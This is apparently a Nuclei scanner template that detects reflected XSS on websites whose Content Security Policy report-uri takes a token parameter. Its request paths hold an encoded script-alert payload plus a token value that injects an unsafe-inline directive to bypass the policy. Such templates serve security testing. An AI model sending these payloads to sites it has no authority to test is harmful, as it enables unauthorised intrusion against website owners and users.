http:
- matchers:
  - part: header
    type: word
    words:
    - ?token=
  - part: body
    type: word
    words:
    - <script>alert(1)</script>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27'
  - '{{BaseURL}}/?%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27'
id: csp-bypass-xss
info:
  author: Umair Hussain,reewardius
  description: Detecting the presence of XSS vulnerability on websites that uses CSP
    report-uri with a token parameter
  name: Reflected XSS protected by CSP, with CSP bypass
  severity: medium
  tags: xss,generic
